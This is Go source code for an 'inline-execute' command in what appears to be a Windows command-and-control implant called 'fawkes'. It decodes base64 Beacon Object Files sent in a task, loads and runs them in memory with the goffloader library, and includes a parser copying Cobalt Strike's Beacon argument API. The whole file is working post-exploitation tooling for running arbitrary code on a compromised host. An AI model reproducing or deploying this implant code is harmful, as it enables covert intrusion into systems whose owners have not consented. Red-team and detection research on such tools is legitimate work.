//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"

	"github.com/praetorian-inc/goffloader/src/coff"
)

// InlineExecuteCommand implements the inline-execute command for BOF/COFF execution
type InlineExecuteCommand struct{}

// Name returns the command name
func (c *InlineExecuteCommand) Name() string {
	return "inline-execute"
}

// Description returns the command description
func (c *InlineExecuteCommand) Description() string {
	return "Execute a Beacon Object File (BOF/COFF) in memory"
}

// InlineExecuteParams represents the parameters for inline-execute
type InlineExecuteParams struct {
	BOFB64        string `json:"bof_b64"`         // Base64-encoded BOF bytes
	EntryPoint    string `json:"entry_point"`     // Entry point function name
	PackedArgsB64 string `json:"packed_args_b64"` // Base64-encoded packed arguments
}

// Execute executes the inline-execute command
func (c *InlineExecuteCommand) Execute(task structs.Task) structs.CommandResult {
	// Parse parameters
	var params InlineExecuteParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate BOF data
	if params.BOFB64 == "" {
		return structs.CommandResult{
			Output:    "Error: No BOF data provided",
			Status:    "error",
			Completed: true,
		}
	}

	// Decode the base64-encoded BOF
	bofBytes, err := base64.StdEncoding.DecodeString(params.BOFB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding BOF data: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(bofBytes) == 0 {
		return structs.CommandResult{
			Output:    "Error: BOF data is empty",
			Status:    "error",
			Completed: true,
		}
	}

	// Decode packed arguments
	packedArgs, err := base64.StdEncoding.DecodeString(params.PackedArgsB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding packed arguments: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Build output string
	var output strings.Builder
	output.WriteString(fmt.Sprintf("[*] BOF size: %d bytes\n", len(bofBytes)))
	output.WriteString(fmt.Sprintf("[*] Entry point: %s\n", params.EntryPoint))
	output.WriteString(fmt.Sprintf("[*] Packed arguments size: %d bytes\n", len(packedArgs)))

	// Load and execute the BOF
	result, err := executeBOF(bofBytes, params.EntryPoint, packedArgs)
	if err != nil {
		output.WriteString(fmt.Sprintf("\n[!] Error executing BOF: %v\n", err))
		return structs.CommandResult{
			Output:    output.String(),
			Status:    "error",
			Completed: true,
		}
	}

	output.WriteString("\n[+] BOF execution completed\n")
	if result != "" {
		output.WriteString(fmt.Sprintf("\n--- BOF Output ---\n%s\n", result))
	}

	return structs.CommandResult{
		Output:    output.String(),
		Status:    "success",
		Completed: true,
	}
}

// executeBOF loads and executes a BOF/COFF file using goffloader
func executeBOF(bofBytes []byte, entryPoint string, packedArgs []byte) (string, error) {
	// Use goffloader to load and execute the BOF
	// The coff.Load function handles:
	// 1. Loading COFF sections into memory
	// 2. Resolving relocations
	// 3. Resolving external symbols (Beacon API functions)
	// 4. Finding and executing the entry point
	// 5. Capturing and returning output
	
	output, err := coff.Load(bofBytes, packedArgs)
	if err != nil {
		return "", fmt.Errorf("failed to load/execute BOF: %w", err)
	}
	
	return output, nil
}

// BeaconDataParser provides a simple interface for BOFs to parse their arguments
// This mimics the Cobalt Strike Beacon Data Parser API
type BeaconDataParser struct {
	buffer []byte
	offset int
}

// NewBeaconDataParser creates a new parser for packed BOF arguments
func NewBeaconDataParser(data []byte) *BeaconDataParser {
	// Skip the first 8 bytes (total size and arg count)
	if len(data) >= 8 {
		return &BeaconDataParser{
			buffer: data,
			offset: 8,
		}
	}
	return &BeaconDataParser{
		buffer: data,
		offset: 0,
	}
}

// ParseInt reads an int32 from the buffer
func (p *BeaconDataParser) ParseInt() int32 {
	if p.offset+8 > len(p.buffer) {
		return 0
	}
	// Skip size (4 bytes)
	p.offset += 4
	// Read value
	val := int32(p.buffer[p.offset]) |
		int32(p.buffer[p.offset+1])<<8 |
		int32(p.buffer[p.offset+2])<<16 |
		int32(p.buffer[p.offset+3])<<24
	p.offset += 4
	return val
}

// ParseShort reads an int16 from the buffer
func (p *BeaconDataParser) ParseShort() int16 {
	if p.offset+6 > len(p.buffer) {
		return 0
	}
	// Skip size (4 bytes)
	p.offset += 4
	// Read value
	val := int16(p.buffer[p.offset]) | int16(p.buffer[p.offset+1])<<8
	p.offset += 2
	return val
}

// ParseString reads a null-terminated string from the buffer
func (p *BeaconDataParser) ParseString() string {
	if p.offset+4 > len(p.buffer) {
		return ""
	}
	// Read size
	size := int(p.buffer[p.offset]) |
		int(p.buffer[p.offset+1])<<8 |
		int(p.buffer[p.offset+2])<<16 |
		int(p.buffer[p.offset+3])<<24
	p.offset += 4

	if p.offset+size > len(p.buffer) {
		return ""
	}

	// Read string (excluding null terminator)
	str := string(p.buffer[p.offset : p.offset+size-1])
	p.offset += size
	return str
}

// ParseBytes reads binary data from the buffer
func (p *BeaconDataParser) ParseBytes() []byte {
	if p.offset+4 > len(p.buffer) {
		return nil
	}
	// Read size
	size := int(p.buffer[p.offset]) |
		int(p.buffer[p.offset+1])<<8 |
		int(p.buffer[p.offset+2])<<16 |
		int(p.buffer[p.offset+3])<<24
	p.offset += 4

	if p.offset+size > len(p.buffer) {
		return nil
	}

	data := make([]byte, size)
	copy(data, p.buffer[p.offset:p.offset+size])
	p.offset += size
	return data
}
